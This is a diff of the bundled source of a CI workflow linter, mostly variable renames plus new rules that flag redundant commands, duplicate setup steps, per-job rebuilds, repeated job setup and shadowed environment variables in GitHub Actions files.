+      for (const entry2 of evidence2) {
+        if (!related.some((location) => location.line === entry2.line)) related.push({ path: model.path, line: entry2.line });
       }
-      const shown = evidence2.slice(0, 3).map((entry) => `${entry.label} (line ${entry.line})`);
+      const shown = evidence2.slice(0, 3).map((entry2) => `${entry2.label} (line ${entry2.line})`);
       report({
         path: model.path,
         line: stage.line,
@@ -16710,13 +16710,13 @@ var shared_base_default = defineRule({
       const file = fileOf(project, model);
       const signatures2 = /* @__PURE__ */ new Set();
       for (const stage of model.stages) {
-        const entry = preamble(file, model, stage);
-        if (!entry) continue;
-        const signature2 = `${entry.base}
-${entry.steps.join("\n")}`;
+        const entry2 = preamble(file, model, stage);
+        if (!entry2) continue;
+        const signature2 = `${entry2.base}
+${entry2.steps.join("\n")}`;
         if (signatures2.has(signature2)) continue;
         signatures2.add(signature2);
-        groups.set(signature2, [...groups.get(signature2) ?? [], entry]);
+        groups.set(signature2, [...groups.get(signature2) ?? [], entry2]);
       }
     }
     for (const [signature2, entries2] of groups) {
@@ -16730,7 +16730,7 @@ ${entry.steps.join("\n")}`;
         confidence: "medium",
         message: `${entries2.length} Dockerfiles start from \`${first.base}\` and repeat the same toolchain preamble (${summarize(first.steps)}).`,
         suggestion: `Move \`FROM ${first.base}\` and the shared install steps into one base Dockerfile, publish it from CI to \`ghcr.io/<org>/${imageName(first.base)}-base\`, and start each of these Dockerfiles with \`FROM ghcr.io/<org>/${imageName(first.base)}-base@sha256:<digest>\` (Dependabot can bump the digest). The layer is then built once and shared across the monorepo.`,
-        related: others.map((entry) => ({ path: entry.model.path, line: entry.stage.line }))
+        related: others.map((entry2) => ({ path: entry2.model.path, line: entry2.stage.line }))
       });
     }
   }
@@ -17134,8 +17134,8 @@ function osOf(label) {
 function describe(label) {
   return osOf(label) === "ubuntu" ? `\`${label}\` is a moving label that is migrating from Ubuntu 24.04 to Ubuntu 26.04 (Oct 19 \u2013 Nov 19, 2026), so the same commit can run on different images` : `\`${label}\` is a moving label that switches OS images when GitHub migrates it, so the same commit can run on different images`;
 }
-function runsOnLabels(source, jobNode, job) {
-  const runsOn = field(source, jobNode, "runs-on");
+function runsOnLabels(source, jobNode5, job) {
+  const runsOn = field(source, jobNode5, "runs-on");
   if (!runsOn?.value) return [];
   let node = runsOn.value;
   let key2 = `${job.key}.runs-on`;
@@ -17159,8 +17159,8 @@ function runsOnLabels(source, jobNode, job) {
     return resolved && value2 !== void 0 ? [{ node: resolved, value: value2, key: `${key2}[${index}]`, direct: direct2 && !(0, import_yaml7.isAlias)(raw) }] : [];
   });
 }
-function matrixValues(source, jobNode, job, name) {
-  const matrix = field(source, field(source, jobNode, "strategy")?.value, "matrix")?.value;
+function matrixValues(source, jobNode5, job, name) {
+  const matrix = field(source, field(source, jobNode5, "strategy")?.value, "matrix")?.value;
   const result = [];
   const axis = field(source, matrix, name)?.value;
   const axisNodes = (0, import_yaml7.isSeq)(resolveNode(source, axis).node) ? items(source, axis) : axis ? [axis] : [];
@@ -17168,8 +17168,8 @@ function matrixValues(source, jobNode, job, name) {
     const value2 = (0, import_yaml7.isScalar)(node) ? stringValue(node) : void 0;
     if (value2 !== void 0) result.push({ node, value: value2, key: `${job.key}.strategy.matrix.${name}[${index}]`, direct: false });
   });
-  items(source, field(source, matrix, "include")?.value).forEach((entry, index) => {
-    const node = field(source, entry, name)?.value;
+  items(source, field(source, matrix, "include")?.value).forEach((entry2, index) => {
+    const node = field(source, entry2, name)?.value;
     const value2 = (0, import_yaml7.isScalar)(node) ? stringValue(node) : void 0;
     if (node && value2 !== void 0) result.push({ node, value: value2, key: `${job.key}.strategy.matrix.include[${index}].${name}`, direct: false });
   });
@@ -17205,21 +17205,21 @@ var pin_runner_default = defineRule({
       const source = workflow.source;
       const file = project.files.get(workflow.path);
       for (const job of workflow.jobs) {
-        const jobNode = jobNodeOf(workflow, job);
-        const labels = runsOnLabels(source, jobNode, job);
+        const jobNode5 = jobNodeOf(workflow, job);
+        const labels = runsOnLabels(source, jobNode5, job);
         if (!labels || labels.some((label) => label.value.trim().toLowerCase() === "self-hosted")) continue;
         for (const label of labels) {
           const value2 = label.value.trim();
           const matrixName = MATRIX_REF.exec(value2)?.[1];
           if (matrixName) {
-            for (const entry of matrixValues(source, jobNode, job, matrixName)) {
-              const candidate = entry.value.trim();
+            for (const entry2 of matrixValues(source, jobNode5, job, matrixName)) {
+              const candidate = entry2.value.trim();
               if (!LATEST.test(candidate)) continue;
               const pinned2 = options[osOf(candidate)];
               report({
                 path: workflow.path,
-                line: lineOfNode(source, entry.node),
-                key: entry.key,
+                line: lineOfNode(source, entry2.node),
+                key: entry2.key,
                 message: `Matrix value ${describe(candidate)}.`,
                 suggestion: `Change the matrix value to \`${pinned2}\` (this renames the matrix jobs, so update required status checks and any \`matrix.${matrixName}\` conditions).`
               });
@@ -17321,8 +17321,8 @@ function exportsSnippet(manifest) {
     conditions.push(["default", relative(module ?? main)]);
   }
   if (conditions.length === 0) return void 0;
-  const entry = conditions.map(([condition, path]) => `"${condition}": "${path}"`).join(", ");
-  return `"exports": { ".": { ${entry} }, "./package.json": "./package.json" }`;
+  const entry2 = conditions.map(([condition, path]) => `"${condition}": "${path}"`).join(", ");
+  return `"exports": { ".": { ${entry2} }, "./package.json": "./package.json" }`;
 }
 function isEsm(manifest) {
   return stringField(manifest, "module") !== void 0 || manifest.json.type === "module";
@@ -17522,7 +17522,7 @@ var version_drift_default = defineRule({
     presets: ["recommended", "agentic"],
     requires: [],
     defaultOptions: { ignore: [] },
-    validateOptions: (value2) => value2.ignore === void 0 || Array.isArray(value2.ignore) && value2.ignore.every((entry) => typeof entry === "string") ? [] : ["ignore must be an array of dependency names"],
+    validateOptions: (value2) => value2.ignore === void 0 || Array.isArray(value2.ignore) && value2.ignore.every((entry2) => typeof entry2 === "string") ? [] : ["ignore must be an array of dependency names"],
     references: [
       "https://pnpm.io/catalogs",
       "https://yarnpkg.com/features/constraints",
@@ -17548,7 +17548,7 @@ var version_drift_default = defineRule({
           const spec2 = raw.trim();
           if (!spec2 || LOCAL_SPEC.test(spec2) || internal.has(dependency) || ignored.has(dependency)) continue;
           const list3 = declarations.get(dependency) ?? [];
-          if (!list3.some((entry) => entry.manifest === manifest && entry.spec === spec2)) list3.push({ manifest, spec: spec2 });
+          if (!list3.some((entry2) => entry2.manifest === manifest && entry2.spec === spec2)) list3.push({ manifest, spec: spec2 });
           declarations.set(dependency, list3);
         }
       }
@@ -17556,17 +17556,17 @@ var version_drift_default = defineRule({
     const manager = project.facts.packageManager.value;
     for (const [dependency, list3] of [...declarations].sort(([a], [b]) => a.localeCompare(b))) {
       const specs = /* @__PURE__ */ new Map();
-      for (const entry of list3) specs.set(entry.spec, [...specs.get(entry.spec) ?? [], entry.manifest.path]);
+      for (const entry2 of list3) specs.set(entry2.spec, [...specs.get(entry2.spec) ?? [], entry2.manifest.path]);
       if (specs.size < 2) continue;
       const [first, ...rest] = list3;
       if (!first) continue;
       const related = [];
-      for (const entry of rest) {
-        if (entry.manifest === first.manifest || related.some((location) => location.path === entry.manifest.path)) continue;
-        related.push({ path: entry.manifest.path, line: entry.manifest.lineOf(dependency) });
+      for (const entry2 of rest) {
+        if (entry2.manifest === first.manifest || related.some((location) => location.path === entry2.manifest.path)) continue;
+        related.push({ path: entry2.manifest.path, line: entry2.manifest.lineOf(dependency) });
       }
       const summary3 = [...specs].slice(0, 4).map(([spec2, paths]) => `\`${spec2}\` (${paths.slice(0, 3).join(", ")}${paths.length > 3 ? `, +${paths.length - 3}` : ""})`).join(", ");
-      const manifestCount = new Set(list3.map((entry) => entry.manifest)).size;
+      const manifestCount = new Set(list3.map((entry2) => entry2.manifest)).size;
       report({
         path: first.manifest.path,
         line: first.manifest.lineOf(dependency),
@@ -17581,6 +17581,594 @@ var version_drift_default = defineRule({
 
 // src/lint/rules/packages/index.ts
 var rules6 = [exports_map_default, files_allowlist_default, monolith_default, version_drift_default];
+
+// src/lint/rules/redundancy/shared.ts
+var import_yaml9 = __toESM(require_dist(), 1);
+var SETUP_ACTIONS = {
+  "actions/setup-node": { version: "node-version", versionFiles: ["node-version-file"] },
+  "actions/setup-python": { version: "python-version", versionFiles: ["python-version-file"] },
+  "actions/setup-go": { version: "go-version", versionFiles: ["go-version-file"] },
+  "actions/setup-java": { version: "java-version", versionFiles: ["java-version-file"] },
+  "actions/setup-dotnet": { version: "dotnet-version", versionFiles: ["global-json-file"] },
+  "ruby/setup-ruby": { version: "ruby-version" },
+  "oven-sh/setup-bun": { version: "bun-version", versionFiles: ["bun-version-file"] },
+  "denoland/setup-deno": { version: "deno-version", versionFiles: ["deno-version-file"] },
+  "pnpm/action-setup": { version: "version" },
+  "astral-sh/setup-uv": { version: "version", versionFiles: ["version-file"] },
+  "hashicorp/setup-terraform": { version: "terraform_version" },
+  "azure/setup-helm": { version: "version" },
+  "azure/setup-kubectl": { version: "version" },
+  "shivammathur/setup-php": { version: "php-version", versionFiles: ["php-version-file"] },
+  "gradle/actions/setup-gradle": {},
+  "dtolnay/rust-toolchain": {},
+  "erlef/setup-beam": {}
+};
+function setupActionOf(step) {
+  const action = step.uses?.action;
+  if (action?.kind !== "remote" || action.name === void 0) return void 0;
+  return Object.hasOwn(SETUP_ACTIONS, action.name) ? action.name : void 0;
+}
+function hash2(text4) {
+  let value2 = 5381;
+  for (let index = 0; index < text4.length; index += 1) value2 = (value2 * 33 ^ text4.charCodeAt(index)) >>> 0;
+  return value2.toString(16).padStart(8, "0");
+}
+function stable(value2) {
+  if (Array.isArray(value2)) return `[${value2.map(stable).join(",")}]`;
+  if (value2 && typeof value2 === "object") {
+    return `{${Object.entries(value2).sort(([a], [b]) => a.localeCompare(b)).map(([key2, entry2]) => `${JSON.stringify(key2)}:${stable(entry2)}`).join(",")}}`;
+  }
+  return JSON.stringify(value2) ?? "undefined";
+}
+function withSignature(step) {
+  return stable(Object.fromEntries([...step.with].map(([key2, entry2]) => [key2, entry2.value])));
+}
+function normalizeScript(script) {
+  return script.split(/\r?\n/).map((line) => line.trim()).filter((line) => line !== "" && !line.startsWith("#")).join("\n").replace(/[ \t]+/g, " ");
+}
+function workingDirectory(workflow, job, step) {
+  return step.workingDirectory ?? job.workingDirectory ?? workflow.workingDirectory;
+}
+function stepSignature(workflow, job, step) {
+  return [
+    step.uses ? `uses:${step.uses.value.trim().toLowerCase()} with:${withSignature(step)}` : "",
+    step.run ? `run:${normalizeScript(step.run.value)}` : "",
+    `cwd:${workingDirectory(workflow, job, step) ?? ""}`,
+    `if:${step.if ?? ""}`,
+    `env:${stable(step.env)}`
+  ].join("\0");
+}
+function directChild2(node, key2) {
+  if (!(0, import_yaml9.isMap)(node)) return void 0;
+  return node.items.find((item) => (0, import_yaml9.isPair)(item) && (0, import_yaml9.isScalar)(item.key) && String(item.key.value) === key2);
+}
+function jobNode(workflow, job) {
+  const node = directChild2(directChild2(workflow.source.doc.contents, "jobs")?.value, job.id)?.value;
+  return (0, import_yaml9.isMap)(node) ? node : void 0;
+}
+function stepNode(workflow, step) {
+  const match2 = /^(?:jobs\.([^.]+)\.steps|runs\.steps)\[(\d+)\]$/.exec(step.key);
+  if (!match2) return void 0;
+  const root = workflow.source.doc.contents;
+  const parent = match2[1] !== void 0 ? directChild2(directChild2(root, "jobs")?.value, match2[1])?.value : directChild2(root, "runs")?.value;
+  const stepsNode = directChild2(parent, "steps")?.value;
+  if (!(0, import_yaml9.isSeq)(stepsNode)) return void 0;
+  const node = stepsNode.items[Number(match2[2])];
+  return (0, import_yaml9.isMap)(node) ? node : void 0;
+}
+function nestedPair(parent, mapKey, key2) {
+  const map = directChild2(parent, mapKey)?.value;
+  if (!(0, import_yaml9.isMap)(map)) return void 0;
+  const pair = directChild2(map, key2);
+  return pair ? { map, pair } : void 0;
+}
+function rawScalar(content, node) {
+  if (!(0, import_yaml9.isScalar)(node) || !node.range) return void 0;
+  const text4 = content.slice(node.range[0], node.range[1]).trim();
+  const quoted = /^(["'])([\s\S]*)\1$/.exec(text4);
+  return quoted ? quoted[2] : text4;
+}
+var VARYING_CONTEXTS = /\b(?:env|steps|job|jobs|matrix|strategy|runner|needs)\s*(?:\.|\[)/;
+function isPositionIndependent(value2) {
+  if (typeof value2 !== "string") return value2 === null || typeof value2 === "number" || typeof value2 === "boolean";
+  const expressions = value2.match(/\$\{\{[\s\S]*?\}\}/g) ?? [];
+  return expressions.every((expression) => !VARYING_CONTEXTS.test(expression));
+}
+
+// src/lint/rules/redundancy/duplicate-command.ts
+var TRIVIAL2 = /* @__PURE__ */ new Set([
+  "echo",
+  "printf",
+  "cd",
+  "pushd",
+  "popd",
+  "ls",
+  "pwd",
+  "set",
+  "export",
+  "unset",
+  "true",
+  "false",
+  ":",
+  "exit",
+  "sleep",
+  "cat",
+  "mkdir",
+  "rm",
+  "cp",
+  "mv",
+  "touch",
+  "date",
+  "env",
+  "whoami",
+  "uname",
+  "df",
+  "du",
+  "wait",
+  "source",
+  ".",
+  "test",
+  "[",
+  "[[",
+  "git",
+  "chmod",
+  "tee",
+  "printenv",
+  "which",
+  "id",
+  "free",
+  "nproc",
+  "shift",
+  "read"
+]);
+var STATEFUL = /(?:^|[\s;&|(])(?:cd|pushd|popd|export|source|unset|if|then|else|elif|fi|case|esac|for|while|until|do|done|function|select)(?=[\s;&|)]|$)|\|\||\(\)\s*\{/m;
+var RESETS = /GITHUB_ENV|GITHUB_PATH/;
+var MIN_WORDS = 2;
+var duplicate_command_default = defineRule({
+  meta: {
+    id: "redundancy/duplicate-command",
+    ruleset: "redundancy",
+    description: "A job should not run the same non-trivial shell command more than once.",
+    rationale: "Repeating an install, build, or test command in one job repeats its cost on every run. It is usually left over from merging two step lists and makes it unclear which invocation the job actually depends on.",
+    kind: "practice",
+    defaultSeverity: "info",
+    presets: ["strict"],
+    requires: [],
+    defaultOptions: {},
+    references: ["https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstepsrun"],
+    impact: "low",
+    example: {
+      bad: "steps:\n  - run: npm ci\n  - run: npm test\n  - run: npm ci",
+      good: "steps:\n  - run: npm ci\n  - run: npm test"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of [...project.workflows, ...project.actions]) {
+      for (const job of workflow.jobs) {
+        if (job.uses) continue;
+        const seen = /* @__PURE__ */ new Map();
+        for (const step of job.steps) {
+          if (step.uses || step.run && RESETS.test(step.run.value)) {
+            seen.clear();
+            continue;
+          }
+          if (!step.run || STATEFUL.test(step.run.value)) continue;
+          const context3 = `${workingDirectory(workflow, job, step) ?? ""}\0${step.if ?? ""}\0${stable(step.env)}`;
+          for (const { command, line } of commandsOf(step)) {
+            const text4 = command.trim().replace(/\s+/g, " ");
+            const words2 = commandWords(text4);
+            const program = words2[0];
+            if (program === void 0 || TRIVIAL2.has(program) || words2.length < MIN_WORDS) continue;
+            if (/[<>]/.test(text4) || text4.includes("$(") || text4.includes("`")) continue;
+            const key2 = `${text4}\0${context3}`;
+            const first = seen.get(key2);
+            if (!first) {
+              seen.set(key2, { line, count: 1 });
+              continue;
+            }
+            first.count += 1;
+            report({
+              path: workflow.path,
+              line,
+              key: `${job.key}.duplicate-command.${hash2(key2)}.${first.count}`,
+              message: `\`${text4}\` already ran earlier in job "${job.id}" (line ${first.line}).`,
+              suggestion: "Remove the repeated command, or explain with a comment why the second run is required.",
+              related: [{ path: workflow.path, line: first.line }]
+            });
+          }
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/redundancy/duplicate-setup-step.ts
+var duplicate_setup_step_default = defineRule({
+  meta: {
+    id: "redundancy/duplicate-setup-step",
+    ruleset: "redundancy",
+    description: "A job should not run the same toolchain setup action twice with the same inputs.",
+    rationale: "Running a setup action a second time with identical inputs reinstalls the same toolchain, adds download and cache-restore time to every run, and usually signals a copy-paste mistake that hides which configuration is authoritative.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["recommended", "agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: ["https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idsteps"],
+    impact: "low",
+    example: {
+      bad: "steps:\n  - uses: actions/setup-node@v4\n    with:\n      node-version: 22\n  - run: npm ci\n  - uses: actions/setup-node@v4\n    with:\n      node-version: 22",
+      good: "steps:\n  - uses: actions/setup-node@v4\n    with:\n      node-version: 22\n  - run: npm ci"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of [...project.workflows, ...project.actions]) {
+      for (const job of workflow.jobs) {
+        if (job.uses) continue;
+        const seen = /* @__PURE__ */ new Map();
+        for (const step of job.steps) {
+          const action = setupActionOf(step);
+          if (!action) continue;
+          const signature2 = `${action}\0${withSignature(step)}\0${step.if ?? ""}`;
+          const first = seen.get(signature2);
+          if (!first) {
+            seen.set(signature2, step);
+            continue;
+          }
+          if (step.id !== void 0) continue;
+          report({
+            path: workflow.path,
+            line: step.line,
+            key: `${step.key}.duplicate-setup`,
+            message: `Job "${job.id}" runs ${action} again with the same inputs as the step on line ${first.line}.`,
+            suggestion: "Remove the repeated setup step; the toolchain from the first step is still on PATH.",
+            related: [{ path: workflow.path, line: first.line }]
+          });
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/redundancy/rebuild-per-job.ts
+var BUILD_COMMANDS = [
+  /^npm run(?:-script)? build(?:\s|$)/,
+  /^(?:pnpm|yarn|bun)(?: run)? build(?:\s|$)/,
+  /^go build(?:\s|$)/,
+  /^cargo build(?:\s|$)/,
+  /^(?:mvn|\.\/mvnw)(?:\s.*)?\s(?:package|install)(?:\s|$)/,
+  /^(?:gradle|\.\/gradlew)(?:\s.*)?\sbuild(?:\s|$)/,
+  /^dotnet build(?:\s|$)/,
+  /^make(?: (?:build|all))?$/
+];
+var ARTIFACT_ACTIONS = ["actions/upload-artifact", "actions/download-artifact"];
+function environment(workflow, job) {
+  const runsOn = JSON.stringify(job.runsOn?.value ?? null);
+  if (runsOn.includes("${{") || job.matrix !== void 0) return void 0;
+  return `${runsOn}\0${job.containerImage?.value ?? ""}\0${stable(job.env)}\0${stable(workflow.env)}`;
+}
+var rebuild_per_job_default = defineRule({
+  meta: {
+    id: "redundancy/rebuild-per-job",
+    ruleset: "redundancy",
+    description: "Several jobs in a workflow should not each rebuild the same project from scratch.",
+    rationale: "When multiple jobs run the same build command on the same runner type, the workflow pays for the build several times and the jobs may test or ship slightly different outputs. Building once and passing the result through an artifact cuts runner minutes and guarantees every downstream job uses the same bits.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: ["https://docs.github.com/en/actions/tutorials/store-and-share-data"],
+    impact: "medium",
+    example: {
+      bad: "jobs:\n  test:\n    steps:\n      - run: npm run build\n      - run: npm test\n  e2e:\n    steps:\n      - run: npm run build\n      - run: npm run e2e",
+      good: "jobs:\n  build:\n    steps:\n      - run: npm run build\n      - uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist\n  e2e:\n    needs: build\n    steps:\n      - uses: actions/download-artifact@v4\n        with:\n          name: dist\n      - run: npm run e2e"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      if (workflow.jobs.some((job) => anyUses(job.steps, ...ARTIFACT_ACTIONS))) continue;
+      const groups = /* @__PURE__ */ new Map();
+      for (const job of workflow.jobs) {
+        if (job.uses) continue;
+        const env = environment(workflow, job);
+        if (env === void 0) continue;
+        const seen = /* @__PURE__ */ new Set();
+        for (const step of job.steps) {
+          if (step.if !== void 0) continue;
+          for (const { command, line } of commandsOf(step)) {
+            if (command.includes("${{")) continue;
+            const words2 = commandWords(command).join(" ");
+            if (!BUILD_COMMANDS.some((pattern) => pattern.test(words2))) continue;
+            const key2 = `${words2}\0${workingDirectory(workflow, job, step) ?? ""}\0${stable(step.env)}\0${env}`;
+            if (seen.has(key2)) continue;
+            seen.add(key2);
+            const group = groups.get(key2) ?? [];
+            group.push({ job, line, command: words2 });
+            groups.set(key2, group);
+          }
+        }
+      }
+      for (const group of groups.values()) {
+        if (group.length < 2) continue;
+        const [first, ...others] = group;
+        if (!first) continue;
+        report({
+          path: workflow.path,
+          line: first.line,
+          key: `${first.job.key}.rebuild.${first.command}`,
+          message: `\`${first.command}\` runs in ${group.length} jobs (${group.map((entry2) => entry2.job.id).join(", ")}) with no artifact handoff.`,
+          suggestion: "Build once in a dedicated job, publish the output with actions/upload-artifact, and have the other jobs `needs:` it and use actions/download-artifact.",
+          confidence: "medium",
+          related: others.map((entry2) => ({ path: workflow.path, line: entry2.line }))
+        });
+      }
+    }
+  }
+});
+
+// src/lint/rules/redundancy/repeated-job-setup.ts
+var INSTALL2 = /^(?:npm (?:ci|install|i)|pnpm (?:install|i)|yarn(?: install)?|bun install|pip3? install|python3? -m pip install|poetry install|uv sync|bundle install|go mod download|composer install|dotnet restore)\b/;
+function isSetup(step) {
+  if (setupActionOf(step)) return true;
+  const name = step.uses?.action?.name ?? "";
+  if (/\/setup-|\/action-setup$/.test(name)) return true;
+  return commandsOf(step).some(({ command }) => INSTALL2.test(commandWords(command).join(" ")));
+}
+function commonPrefix(candidates) {
+  let length = 0;
+  const [first, ...rest] = candidates;
+  if (!first) return 0;
+  while (length < first.signatures.length && rest.every((entry2) => entry2.signatures[length] === first.signatures[length])) length += 1;
+  return length;
+}
+var repeated_job_setup_default = defineRule({
+  meta: {
+    id: "redundancy/repeated-job-setup",
+    ruleset: "redundancy",
+    description: "Jobs that repeat the same leading setup steps could share a composite action.",
+    rationale: "When many jobs open with the same checkout, toolchain, and install steps, every change to that setup (a new cache key, an action upgrade, a registry login) has to be made in each copy. Copies drift, and drifted setup is a common source of 'works in one job, fails in another'. A local composite action keeps one definition.",
+    kind: "insight",
+    defaultSeverity: "info",
+    presets: ["insights"],
+    requires: [],
+    defaultOptions: { minJobs: 3, minSteps: 3 },
+    validateOptions: (options) => Object.entries(options).filter(([, value2]) => typeof value2 !== "number" || !Number.isInteger(value2) || value2 < 2).map(([key2]) => `${key2} must be an integer of at least 2`),
+    references: ["https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-composite-action"],
+    impact: "low",
+    example: {
+      bad: "jobs:\n  lint:\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n      - run: npm ci\n      - run: npm run lint\n  test:\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n      - run: npm ci\n      - run: npm test\n  build:\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n      - run: npm ci\n      - run: npm run build",
+      good: "jobs:\n  lint:\n    steps:\n      - uses: actions/checkout@v4\n      - uses: ./.github/actions/setup\n      - run: npm run lint"
+    }
+  },
+  check({ project, options, report }) {
+    const minJobs = Number(options.minJobs);
+    const minSteps = Number(options.minSteps);
+    const groups = /* @__PURE__ */ new Map();
+    for (const workflow of project.workflows) {
+      for (const job of workflow.jobs) {
+        if (job.uses || job.steps.length < minSteps) continue;
+        const signatures2 = job.steps.map((step) => stepSignature(workflow, job, step));
+        const key2 = signatures2.slice(0, minSteps).join("");
+        const group = groups.get(key2) ?? [];
+        group.push({ workflow, job, signatures: signatures2 });
+        groups.set(key2, group);
+      }
+    }
+    for (const group of groups.values()) {
+      if (group.length < minJobs) continue;
+      const [first, ...others] = group;
+      if (!first) continue;
+      const length = commonPrefix(group);
+      const prefix = first.job.steps.slice(0, length);
+      if (prefix.some((step) => step.uses?.action?.kind === "local" || step.uses?.action?.kind === "expression")) continue;
+      if (!prefix.some(isSetup)) continue;
+      if (group.every((entry2) => entry2.job.steps.length === length)) continue;
+      const jobs = group.map((entry2) => entry2.workflow === first.workflow ? entry2.job.id : `${entry2.workflow.path}#${entry2.job.id}`);
+      report({
+        path: first.workflow.path,
+        line: first.job.line,
+        key: `${first.job.key}.repeated-setup.${hash2(first.signatures.slice(0, length).join(""))}`,
+        message: `${group.length} jobs start with the same ${length} setup steps (${jobs.join(", ")}).`,
+        suggestion: "Move the shared steps into a composite action under `.github/actions/<name>/action.yml` and call it with `uses: ./.github/actions/<name>` after checkout.",
+        confidence: "medium",
+        related: others.map((entry2) => ({ path: entry2.workflow.path, line: entry2.job.line }))
+      });
+    }
+  }
+});
+
+// src/lint/rules/redundancy/shadowed-env.ts
+var import_yaml10 = __toESM(require_dist(), 1);
+function entry(workflow, file, parent, key2) {
+  const found = nestedPair(parent, "env", key2);
+  if (!found || !(0, import_yaml10.isScalar)(found.pair.value)) return void 0;
+  const raw = rawScalar(file.content, found.pair.value);
+  if (raw === void 0) return void 0;
+  const owner = (0, import_yaml10.isMap)(parent) ? parent.items.find((item) => item.value === found.map) : void 0;
+  return { map: found.map, owner, pair: found.pair, raw, line: lineOfNode(workflow.source, found.pair.key) };
+}
+function removal(workflow, file, inner) {
+  if (inner.map.flow) return void 0;
+  const value2 = inner.pair.value;
+  if (!(0, import_yaml10.isScalar)(value2) || !value2.range) return void 0;
+  if (lineOfNode(workflow.source, value2) !== inner.line) return void 0;
+  const valueEnd = workflow.source.lineCounter.linePos(value2.range[1]).line;
+  if (valueEnd !== inner.line) return void 0;
+  let start2 = lineStart(file.content, inner.line);
+  if (inner.map.items.length === 1) {
+    const ownerLine = inner.owner ? lineOfNode(workflow.source, inner.owner.key) : 0;
+    if (ownerLine !== inner.line - 1 || !/^\s*env:\s*(?:#.*)?$/.test(lineText(file.content, ownerLine))) return void 0;
+    start2 = lineStart(file.content, ownerLine);
+  }
+  return fix(`Remove duplicate env ${String(inner.pair.key.value)}`, {
+    path: file.path,
+    start: start2,
+    end: lineStart(file.content, inner.line + 1),
+    text: ""
+  });
+}
+var shadowed_env_default = defineRule({
+  meta: {
+    id: "redundancy/shadowed-env",
+    ruleset: "redundancy",
+    description: "A job or step should not redefine an environment variable to the value it already inherits.",
+    rationale: "Workflow-level `env` is inherited by every job and step. Repeating the same `KEY: value` lower down adds noise and creates a second copy that must be changed in lockstep; when only one copy is updated, the inner one silently wins.",
+    kind: "practice",
+    defaultSeverity: "info",
+    presets: ["recommended", "strict"],
+    requires: [],
+    defaultOptions: {},
+    references: ["https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#env"],
+    impact: "low",
+    fixable: true,
+    example: {
+      bad: "env:\n  NODE_ENV: test\njobs:\n  test:\n    env:\n      NODE_ENV: test",
+      good: "env:\n  NODE_ENV: test\njobs:\n  test:\n    runs-on: ubuntu-24.04"
+    }
+  },
+  check({ project, report }) {
+    for (const workflow of project.workflows) {
+      const file = project.files.get(workflow.path);
+      if (!file) continue;
+      const root = workflow.source.doc.contents;
+      const check = (outer, inner, scope2, key2, reportKey) => {
+        if (!outer || !inner || outer.raw !== inner.raw) return;
+        const edit = removal(workflow, file, inner);
+        report({
+          path: workflow.path,
+          line: inner.line,
+          key: reportKey,
+          message: `${scope2} sets ${key2}=${inner.raw}, which it already inherits from line ${outer.line}.`,
+          suggestion: `Remove the inner \`${key2}\` entry and rely on the inherited value.`,
+          related: [{ path: workflow.path, line: outer.line }],
+          ...edit ? { fix: edit } : {}
+        });
+      };
+      for (const job of workflow.jobs) {
+        if (job.uses) continue;
+        const node = jobNode(workflow, job);
+        if (!node) continue;
+        for (const [key2, value2] of Object.entries(job.env)) {
+          if (!Object.hasOwn(workflow.env, key2) || !isPositionIndependent(value2)) continue;
+          check(entry(workflow, file, root, key2), entry(workflow, file, node, key2), `Job "${job.id}"`, key2, `${job.key}.env.${key2}`);
+        }
+        let writesEnv = false;
+        for (const step of job.steps) {
+          if (!writesEnv) {
+            const target = stepNode(workflow, step);
+            for (const [key2, value2] of Object.entries(step.env)) {
+              if (!isPositionIndependent(value2)) continue;
+              const outer = Object.hasOwn(job.env, key2) ? entry(workflow, file, node, key2) : Object.hasOwn(workflow.env, key2) ? entry(workflow, file, root, key2) : void 0;
+              if (!outer || !target) continue;
+              check(outer, entry(workflow, file, target, key2), `Step ${step.index + 1} of job "${job.id}"`, key2, `${step.key}.env.${key2}`);
+            }
+          }
+          if (step.run && /GITHUB_ENV/.test(step.run.value)) writesEnv = true;
+        }
+      }
+    }
+  }
+});
+
+// src/lint/rules/redundancy/toolchain-version-drift.ts
+function normalize3(raw) {
+  const version = raw.trim().replace(/^v/i, "").replace(/(?:\.[x*])+$/i, "");
+  return /^\d+(?:\.\d+)*$/.test(version) ? version : void 0;
+}
+function compatible(a, b) {
+  const left = a.split(".");
+  const right = b.split(".");
+  return left.slice(0, right.length).join(".") === right.slice(0, left.length).join(".");
+}
+function conflicting(versions) {
+  return versions.some((a, index) => versions.slice(index + 1).some((b) => !compatible(a, b)));
+}
+var VERSION_FILES = {
+  "actions/setup-node": "`.nvmrc` or `.node-version` (`node-version-file`)",
+  "actions/setup-python": "`.python-version` (`python-version-file`)",
+  "actions/setup-go": "`go.mod` (`go-version-file`)",
+  "actions/setup-java": "`.java-version` or `.sdkmanrc` (`java-version-file`)",
+  "actions/setup-dotnet": "`global.json` (`global-json-file`)",
+  "oven-sh/setup-bun": "`.bun-version` (`bun-version-file`)",
+  "ruby/setup-ruby": "`.ruby-version` (omit `ruby-version`)",
+  "pnpm/action-setup": "the `packageManager` field in package.json (omit `version`)"
+};
+var toolchain_version_drift_default = defineRule({
+  meta: {
+    id: "redundancy/toolchain-version-drift",
+    ruleset: "redundancy",
+    description: "Workflows should agree on the toolchain version they install with each setup action.",
+    rationale: "When one workflow installs Node 20 and another Node 22, or Python 3.11 versus 3.12, CI validates on one runtime and releases on another. These pins are usually updated one file at a time, so they drift. A single version file read by every setup step keeps them aligned. This covers language toolchains installed by setup actions, not package dependency versions.",
+    kind: "practice",
+    defaultSeverity: "warn",
+    presets: ["agentic", "strict"],
+    requires: [],
+    defaultOptions: {},
